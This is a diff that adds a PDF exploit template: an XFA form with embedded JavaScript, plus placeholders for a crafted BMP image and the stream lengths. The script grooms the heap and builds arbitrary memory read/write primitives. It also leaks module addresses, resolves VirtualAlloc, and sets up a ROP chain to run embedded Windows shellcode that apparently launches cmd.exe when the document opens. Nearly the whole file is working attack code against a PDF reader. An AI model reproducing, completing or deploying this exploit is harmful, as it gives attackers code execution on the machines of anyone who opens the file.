@@ -1,0 +1,514 @@
+%PDF-1.7
+1 0 obj
+<<
+    /Type /Catalog
+    /AcroForm 5 0 R
+    /Pages 2 0 R
+    /NeedsRendering true
+    /Extensions
+    <<
+        /ADBE
+        <<
+            /ExtensionLevel 3
+            /BaseVersion /1.7
+        >>
+    >>
+>>
+endobj
+2 0 obj
+<<
+    /Type /Pages
+    /Kids [3 0 R]
+    /Count 1
+>>
+endobj
+3 0 obj
+<<
+    /Type /Page
+    /Parent 2 0 R
+    /Contents 4 0 R
+    /Resources
+    <<
+        /Font
+        <<
+            /F1
+            <<
+                /BaseFont /Helvetica
+                /Subtype /Type1
+                /Name /F1
+            >>
+        >>
+    >>
+>>
+endobj
+4 0 obj
+<<
+    /Length 104
+>>
+stream
+BT
+/F1 12 Tf
+90 692 Td
+(If you see this page, it means that your PDF reader does not support XFA.) Tj
+ET
+endstream
+endobj
+5 0 obj
+<<
+    /XFA 6 0 R
+>>
+endobj
+6 0 obj
+<<
+    /Filter /FlateDecode
+    /Length __STREAM_LENGTH__
+>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+  <template xmlns:xfa="http://www.xfa.org/schema/xfa-template/3.1/" xmlns="http://www.xfa.org/schema/xfa-template/3.0/">
+    <subform name="form1" layout="tb" locale="en_US" restoreState="auto">
+      <pageSet>
+        <pageArea name="Page1" id="Page1">
+          <contentArea x="0.25in" y="0.25in" w="576pt" h="756pt"/>
+          <medium stock="default" short="612pt" long="792pt"/>
+        </pageArea>
+      </pageSet>
+      <subform w="576pt" h="756pt">
+        <field name="ImageCrash">
+          <ui>
+            <imageEdit/>
+          </ui>
+          <value>
+            <image aspect="actual" contentType="image/bmp">
+__IMAGE_BASE64_DATA__
+            </image>
+          </value>
+        </field>
+      </subform>
+      <event activity="initialize" name="event__initialize">
+        <script contentType="application/x-javascript">
+		function fillHeap() {
+			var array = new Array(0x1200);
+			array[0] = new ArrayBuffer(0xFFE8);
+			var dv = new DataView(array[0]);
+
+			dv.setUint32(0xFB8, 0x10100058, true);
+			dv.setUint32(0, 0x10100058, true);
+			dv.setUint32(0xFFA8, 0x10100258, true);
+			dv.setUint32(0x200 + 0x14, 0x10100358, true);
+
+			dv.setUint32(0xFFA4, 0x10100458, true);
+			var i = 1
+			while (true)
+			{
+				array[i] = array[0].slice();
+				i = i + 1;
+				if( i == array.length)
+				{
+					break;
+				}
+			}
+			return array;
+		}
+		
+		app.holeArray = new Array(0x50);
+		var i = 0;
+		while(true)
+		{
+			app.holeArray[i] = new ArrayBuffer(0xe0);
+			dv = DataView(app.holeArray[i]);
+			dv.setUint32(0,0x13371300+i,true);
+			i = i + 1;
+			if( i == 0x100)
+			{	
+				break;
+			}
+		}
+		
+		var j = 1;
+		while(true)
+		{
+			delete app.holeArray[j];
+			app.holeArray[j] = null;
+			j = j + 2;
+			if(j == 0x100-1 )
+			{
+				break;
+			}
+		}
+		
+		app.newABuffer4 = new ArrayBuffer(10);
+		dv4 = DataView(app.newABuffer4);
+		dv4.setUint32(0,0x67890000,true);
+		app.newABuffer5 = new ArrayBuffer(0x2c);;
+
+		app.cmyArray = new Array(0x40);
+		app.cmyArray[0] = 0x12003400;
+		app.cmyArray[1] = 0;
+		app.cmyArray[2] = 0;
+		app.cmyArray[3] = 0x12003400;
+
+		
+		
+		myArray = fillHeap();	
+		
+        </script>
+      </event>
+      <event activity="docReady" ref="$host" name="event__docReady">
+        <script contentType="application/x-javascript">
+		
+		app.alert("docReady ..");
+		
+		var overLength_Index = 0;
+		var k = 2;
+		while(true)
+		{
+			len = app.holeArray[k].byteLength;
+			if(len == 0x10101010 || k == 0x100-2)
+			{
+				overLength_Index = k;
+				break;
+			}
+			k = k + 2;
+		}
+		var overLength_dv = DataView(app.holeArray[overLength_Index]);
+		app.alert("over Length Index =" + overLength_Index.toString(16));
+		var controlAB_index = 0;
+		while(true)
+		{
+			temp2 = overLength_dv.getUint32(controlAB_index,true);
+			if(temp2.toString(16) == "13371314" ||temp2.toString(16) == "13371324"  )
+			{	
+				overLength_dv.setUint32(controlAB_index-3*4,-1,true);
+				break;
+			}
+			controlAB_index = controlAB_index + 1;
+		}
+		//app.alert("Stop ..");
+		var controlABuffer_Index = 0;
+		var kk = 2;
+		while(true)
+		{
+			len = app.holeArray[kk].byteLength;
+			if(len == -1  )
+			{
+				controlABuffer_Index = kk;
+				break;
+			}
+			kk = kk + 2;
+		}
+		var controlAB = DataView(app.holeArray[controlABuffer_Index]);
+		var offser_f0 = controlAB.getUint32(60*4,true);
+		//app.alert("offser_f0 = " + offser_f0.toString(16));
+		bufferAdd = offser_f0 + 0x108;
+		//app.alert("bufferAdd = " + bufferAdd.toString(16));
+		var leak_id = 0;
+		var flag2 = 0;
+		offset_abuffer = leakObject(app.newABuffer4);
+		app.alert("offset_abuffer = " + offset_abuffer.toString(16));
+		
+		offset =  bufferAdd - offset_abuffer;
+		
+		offset_len = 0-offset + 7 * 4;
+		controlAB.setUint32(offset_len,-1,true);
+		over_dv1 = DataView(app.newABuffer4);
+
+		var content = Uint32Array(app.newABuffer5);
+		oldBP = over_dv1.getUint32(31*4,true);
+		
+		var realBP_offset = 0;
+		var i = 0;
+
+		off__ = 0x7cc;
+		while(true)
+		{
+			tt = (0 - off__)*4;
+			off1 = over_dv1.getUint32(tt,true);
+			if( off1 == oldBP )
+			{
+				realBP_offset = tt;
+				app.alert("realBP_offset = " + realBP_offset.toString(16));
+				break;
+			}
+			off__ = off__ + 1;
+		}
+	
+		//Write(bufferAdd,0x41414141,1);
+		//var rd1 = Read(bufferAdd,1);
+		//app.alert("rd1 = " + rd1.toString(16));
+		//over_dv2 = DataView(app.newABuffer5);
+		
+		var classBuffer = {};
+		var shell_buffer = new Uint32Array(0x1000);
+		classBuffer.code = shell_buffer;
+		
+		var code_00 = new Array()
+		code_00 = ["0xCCCCCCCC","0x83ec8b60","0x909040ec","0xa164c931","0x00000030","0x8b0c408b","0x96ad1470","0x10588bad","0x013c538b","0x78528bda",
+"0x728bda01","0x31de0120","0x01ad41c9","0x473881d8","0x75507465","0x047881f4","0x41636f72","0x7881eb75","0x72646408",
+"0x8be27565","0xde012472","0x4e0c8b66","0x1c728b49","0x148bde01","0x31da018e","0x315e52f6","0x315f53ff","0x786851c9",
+"0x68006365","0x456e6957","0x5351e189","0xc931d2ff","0x73656851","0x50680073","0x68636f72","0x74697845","0x5751e189",
+"0xc789ff31","0xf631d6ff","0xc9315e50","0x78656851","0x63680065","0x892e646d","0x51016ae1","0xc483d7ff","0x90c36168",
+"0x9090ec89","0x909090c3"];
+
+		/* Copy the shellcode to the shellcode buffer */
+		for(var i=0;i!=code_00.length;i++)
+		{ shell_buffer[i]=code_00[i];}
+		
+	
+		clbAddr = leakObject(classBuffer);
+		
+		// Native 
+		var Native_addr = clbAddr;
+		app.alert("Native_addr = " + Native_addr.toString(16));
+		
+		var forLeak = Read(Native_addr,1);
+		var EScriptOffset = Read(forLeak,0);
+		var leakAddr = EScriptOffset - EScriptOffset%0x10000;
+
+		var EScriptAddr = 0;
+		while(true)
+		{
+			var MZHead = Read(leakAddr,0);
+			if( MZHead == 0x00905a4d )
+			{
+				EScriptAddr = leakAddr;
+				break;
+			}
+			leakAddr = leakAddr - 0x1000;
+		}
+		
+		var pointMyArray = Read(Native_addr,6);
+		var MyArray = Read(pointMyArray,10);
+		var bufferPointer = Read(MyArray,3);
+		var virtualAlloc = findVirtualProct();
+		var xchg_Stack = 0x0000953e + EScriptAddr;
+		var pop_Esp = 0x0001172e + EScriptAddr;
+		var ObScAddr = 0x23A81394 - 0x23800000 + EScriptAddr;
+		var ObScAddr = Read(ObScAddr,0);
+		app.alert("ObScAddr = " + ObScAddr.toString(16));
+		Write(ObScAddr,virtualAlloc,0);
+		Write(ObScAddr,bufferPointer+0x4,1);
+		Write(ObScAddr,bufferPointer,2);
+		Write(ObScAddr,0x1000,3);
+		Write(ObScAddr,0x1000,4);
+		Write(ObScAddr,0x40,5);
+		Write(ObScAddr+0x598,xchg_Stack,0);
+		app.alert("this will trigger the ROP");
+		
+
+
+		function Read(addr,index)
+		{	
+			over_dv1.setUint32(31*4,addr,true);
+			over_dv1.setUint32(realBP_offset,addr,true);
+		
+			return content[index];
+		}
+		
+		function Write(addr,value,index)
+		{
+			over_dv1.setUint32(31*4,addr,true);
+			over_dv1.setUint32(realBP_offset,addr,true);
+			content[index] = value;
+		}
+		function leakObject(Obj)
+		{
+			app.cmyArray[1] = Obj;
+			var temp1;
+			var temp2;
+			var k ;
+			var flag =0;
+			var buffer = 0;
+			//app.alert("stop..");
+			if(leak_id == 0)
+			{
+				k = 0xa0000;
+				flag = 0;
+				
+				//app.alert("magic = " + magic.toString(16));
+				while(flag!=0x50000)
+				{
+					tt1 = (0+k)*4;
+					tt2 = (1+k)*4;
+					temp1 = controlAB.getUint32(tt1,true);
+					temp2 = controlAB.getUint32(tt2,true);
+					if(temp1.toString(16) == "40")
+					{
+						if(temp2.toString(16) == "12003400")
+						{
+							flag2 = 1;
+							tt3 = (3+k)*4;
+							buffer = controlAB.getUint32(tt3,true);
+							break;
+						}
+					}
+					
+					k = k + 1;
+					flag = flag + 1;
+				}
+				leak_id = k;
+				//app.alert("now k = " +k.toString(16));
+				if(flag == 0x50000)
+				{
+					k = 0x1000;
+					flag = 0;
+					while(flag != 0x2000000)
+					{
+						tt1 = (0-k)*4;
+						tt2 = (1-k)*4;
+						temp1 = controlAB.getUint32(tt1,true);
+						temp2 = controlAB.getUint32(tt2,true);
+						if(temp1.toString(16) == "40")
+						{
+							if(temp2.toString(16) == "12003400")
+							{
+								tt3 = (3-k)*4;
+								buffer = controlAB.getUint32(tt3,true);
+								break;
+							}
+						}
+						
+						k = k + 1;
+						flag = flag + 1;
+					}
+				}
+				leak_id = k;
+				app.alert("now leak_id = " +leak_id.toString(16));
+				
+			}
+			else 
+			{
+				//app.alert("flag2 = " +flag2);
+				if(flag2 == 1)
+				{
+					tt3 = (3+leak_id)*4;
+				}
+				else
+				{
+					tt3 = (3-leak_id)*4;
+				}
+				buffer = controlAB.getUint32(tt3,true);
+			}
+			
+			return buffer;
+		}
+		
+		function findVirtualProct()
+		{
+			var kernel32_VP = 0x0;
+			var kernel32_VP_offset = 0x0;
+			var kernel_import = 0x0;
+			var kernel_Name_point = 0x0;
+			var pe_offset = Read(EScriptAddr + 0x3c,0);
+			var pe_addr = EScriptAddr + pe_offset;
+			var import_offset = Read(pe_addr + 0x80,0);
+			var imoprt_addr = EScriptAddr + import_offset;
+			var k = 1;
+			while(1)
+			{
+				var kernel_addr = Read(imoprt_addr,3);
+				var string1_kernel32 = Read(EScriptAddr+kernel_addr,0);  // 4e52454b   KERN
+				var string2_kernel32 = Read(EScriptAddr+kernel_addr,1);  // 32334c45   EL32
+				if(string1_kernel32 == 0x4e52454b)
+				{
+					 if( string2_kernel32 == 0x32334c45)
+					 {
+						kernel_import = imoprt_addr;
+						break;
+					}
+				}
+				imoprt_addr = imoprt_addr + 4*5*k;
+				k = k + 1;
+			}
+			kernel_Name_point = Read(kernel_import,0);
+			
+			var VP_offset = 0;
+			while(1)
+			{
+				var name_offset = Read(EScriptAddr+kernel_Name_point+VP_offset,0);
+				var name_addr = EScriptAddr + name_offset;
+				var string1_VP = Read(name_addr,1);   // rtua  61757472 
+				var string2_VP = Read(name_addr,2);   // lall  6c6c416c  
+				if( string1_VP == 0x61757472 )
+				{
+					if( string2_VP == 0x6c6c416c  )
+					{
+						kernel32_VP_offset = VP_offset;
+						break;
+					}
+				}
+				VP_offset = VP_offset + 4;
+			}
+			kernel32_VP = EScriptAddr + Read(kernel_import,4);
+			kernel32_VP_Addr = Read(kernel32_VP+kernel32_VP_offset,0);
+			return kernel32_VP_Addr;
+		}
+				
+		
+		function sleep(numberMillis) 
+		{ 
+			var now = new Date(); 
+			var exitTime = now.getTime() + numberMillis; 
+			while (true) 
+			{ 
+				now = new Date(); 
+				if (now.getTime() > exitTime) 
+				return; 
+			} 
+		}
+				
+		
+		
+		
+        </script>
+      </event>
+    </subform>
+  </template>
+  <config xmlns="http://www.xfa.org/schema/xci/3.0/">
+    <agent name="designer">
+      <!--  [0..n]  -->
+      <destination>pdf</destination>
+      <pdf>
+        <!--  [0..n]  -->
+        <fontInfo/>
+      </pdf>
+    </agent>
+    <present>
+      <!--  [0..n]  -->
+      <pdf>
+        <!--  [0..n]  -->
+        <version>1.7</version>
+        <adobeExtensionLevel>5</adobeExtensionLevel>
+      </pdf>
+      <common/>
+      <xdp>
+        <packets>*</packets>
+      </xdp>
+    </present>
+  </config>
+  <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
+    <xfa:data xfa:dataNode="dataGroup"/>
+  </xfa:datasets>
+  <xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve">
+    <annots/>
+  </xfdf>
+</xdp:xdp>
+endstream
+endobj
+xref
+0 7
+0000000000 65535 f 
+0000000009 00000 n 
+0000000237 00000 n 
+0000000306 00000 n 
+0000000587 00000 n 
+0000000746 00000 n 
+0000000782 00000 n 
+trailer
+<<
+    /Root 1 0 R
+    /Size 7
+>>
+startxref
+__XREF_OFFSET__
+%%EOF
